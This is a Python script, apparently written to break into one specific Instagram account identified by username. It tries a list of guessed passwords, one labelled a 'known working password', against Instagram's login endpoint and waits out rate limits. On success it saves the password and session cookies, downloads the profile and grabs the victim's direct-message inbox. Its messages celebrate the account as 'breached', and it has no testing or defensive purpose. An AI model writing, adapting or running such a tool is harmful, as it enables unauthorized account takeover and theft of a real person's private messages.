#!/usr/bin/env python3
"""
Quick whatilove1728 Account Checker
Fast bypass attempt for whatilove1728 account specifically
"""

import requests
import json
import time
from datetime import datetime

def quick_whatilove1728_check():
    print("🎯 Quick whatilove1728 Account Checker")
    print("=" * 40)
    
    # Primary target and passwords
    target_username = "whatilove1728"
    test_passwords = [
        "whatilove1728",  # Exact match
        "WhatILove1728",  # Capitalized
        "Fleming654",     # Known working password
        "whatilove",      # Shortened
        "WhatILove",      # Capitalized short
        "Fleming1728",    # Hybrid
        "whatilove654",   # Hybrid
        "1728whatilove"   # Reversed
    ]
    
    session = requests.Session()
    
    print(f"👤 Target: {target_username}")
    print(f"🔑 Testing {len(test_passwords)} passwords...")
    
    for i, password in enumerate(test_passwords, 1):
        print(f"\n[{i}/{len(test_passwords)}] Testing: {password}")
        
        try:
            # Simple login attempt
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # Get CSRF token
            login_page = session.get("https://www.instagram.com/accounts/login/", headers=headers, timeout=10)
            csrf_token = session.cookies.get('csrftoken', '')
            
            headers['X-CSRFToken'] = csrf_token
            headers['X-Requested-With'] = 'XMLHttpRequest'
            
            login_data = {
                'username': target_username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            response = session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=login_data,
                headers=headers,
                timeout=10
            )
            
            print(f"   📊 Response: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    if data.get('authenticated'):
                        # SUCCESS!
                        sessionid = session.cookies.get('sessionid')
                        ds_user_id = session.cookies.get('ds_user_id')
                        
                        success_data = {
                            "username": target_username,
                            "password": password,
                            "sessionid": sessionid,
                            "ds_user_id": ds_user_id,
                            "timestamp": datetime.now().isoformat(),
                            "status": "BREAKTHROUGH"
                        }
                        
                        print(f"   🎉 BREAKTHROUGH! Password found: {password}")
                        print(f"   ✅ Session ID: {sessionid[:20]}...")
                        print(f"   ✅ User ID: {ds_user_id}")
                        
                        # Save success
                        success_file = f"WHATILOVE1728_SUCCESS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                        with open(success_file, 'w') as f:
                            json.dump(success_data, f, indent=2)
                        
                        print(f"   💾 Success saved: {success_file}")
                        
                        # Try to extract basic profile info
                        extract_whatilove1728_data(sessionid, ds_user_id)
                        
                        return success_data
                    
                    elif 'checkpoint_required' in str(data):
                        print(f"   ⚠️ Checkpoint required - account exists but locked")
                    elif 'invalid_user' in str(data) or 'user_not_found' in str(data):
                        print(f"   ❌ Account does not exist")
                        break  # No point trying more passwords
                    else:
                        print(f"   ❌ Wrong password")
                        
                except json.JSONDecodeError:
                    print(f"   ⚠️ Non-JSON response")
                    
            elif response.status_code == 429:
                print(f"   ⏳ Rate limited - waiting...")
                time.sleep(30)
                continue
            elif response.status_code == 403:
                print(f"   🚫 Blocked - trying next...")
            else:
                print(f"   ❌ Error: {response.status_code}")
                
        except Exception as e:
            print(f"   💥 Exception: {e}")
        
        # Delay between attempts
        time.sleep(5)
    
    print(f"\n❌ No successful bypass found for {target_username}")
    return None

def extract_whatilove1728_data(sessionid, user_id):
    """Extract data from whatilove1728 account"""
    print(f"\n📊 Extracting whatilove1728 account data...")
    
    session = requests.Session()
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android',
        'Cookie': f'sessionid={sessionid}; ds_user_id={user_id}',
        'X-Instagram-AJAX': '1'
    }
    
    try:
        # Get profile page
        profile_response = session.get("https://www.instagram.com/whatilove1728/", headers=headers, timeout=10)
        
        if profile_response.status_code == 200:
            print(f"   ✅ Profile accessible")
            
            # Save profile
            profile_file = f"whatilove1728_profile_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
            with open(profile_file, 'w', encoding='utf-8') as f:
                f.write(profile_response.text)
            
            print(f"   💾 Profile saved: {profile_file}")
            
            # Try to get DMs
            dm_response = session.get("https://www.instagram.com/direct/inbox/", headers=headers, timeout=10)
            if dm_response.status_code == 200:
                print(f"   ✅ DM inbox accessible")
                
                dm_file = f"whatilove1728_dms_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                with open(dm_file, 'w', encoding='utf-8') as f:
                    f.write(dm_response.text)
                
                print(f"   💾 DMs saved: {dm_file}")
        
    except Exception as e:
        print(f"   ❌ Data extraction failed: {e}")

def check_account_exists(username):
    """Quick check if account exists"""
    print(f"\n🔍 Checking if {username} exists...")
    
    try:
        response = requests.get(f"https://www.instagram.com/{username}/", timeout=10)
        
        if response.status_code == 200:
            if "Sorry, this page isn't available" in response.text:
                print(f"   ❌ Account {username} does not exist")
                return False
            else:
                print(f"   ✅ Account {username} exists")
                return True
        else:
            print(f"   ⚠️ Cannot determine existence: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"   ❌ Error checking account: {e}")
        return None

if __name__ == "__main__":
    print("🚀 Starting whatilove1728 bypass check...")
    
    # First check if account exists
    if check_account_exists("whatilove1728"):
        # Account exists, try bypass
        result = quick_whatilove1728_check()
        
        if result:
            print(f"\n🎉 SUCCESS! whatilove1728 account breached!")
            print(f"📧 Username: {result['username']}")
            print(f"🔑 Password: {result['password']}")
            print(f"🕒 Time: {result['timestamp']}")
        else:
            print(f"\n❌ Failed to breach whatilove1728 account")
    else:
        print(f"\n⚠️ Account whatilove1728 may not exist or is private")
    
    print(f"\n🏁 Process complete")
